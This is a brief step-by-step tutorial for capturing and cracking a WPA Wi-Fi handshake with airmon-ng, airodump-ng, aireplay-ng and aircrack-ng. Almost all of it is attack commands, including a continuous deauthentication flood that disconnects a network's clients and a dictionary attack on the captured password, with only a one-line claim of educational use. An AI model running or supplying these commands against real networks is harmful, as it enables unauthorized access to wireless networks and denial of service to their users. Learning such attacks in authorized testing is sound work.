This tutorial demonstrates all key steps: monitor mode activation, network scanning, targeting, deauthentication, and WPA handshake capture.

Note: This content is for educational and authorized security testing only.

1. iwconfig

iwconfig

Check wireless interfaces and their current mode. Identify wlan0 or other adapters.

2. Start Monitor Mode

sudo airmon-ng start wlan0

Enable monitor mode on wlan0, transforming it into wlan0mon.

3. Confirm Monitor Mode

iwconfig

Ensure your interface is now operating in monitor mode.

4. Scan for Networks

sudo airodump-ng wlan0mon

Displays SSIDs, BSSIDs, signal levels, encryption, and clients connected.

5. Target Specific Network

sudo airodump-ng -c [channel] --bssid [target BSSID] -w /root wlan0mon

Capture packets only from a selected access point.

6. Send Deauth Packets

sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon

Disconnects clients to trigger a handshake when they reconnect.

7. Crack WPA Handshake

sudo aircrack-ng -w rockyou.txt root-06.cap

Use a dictionary attack with rockyou.txt to crack the password from the handshake capture.
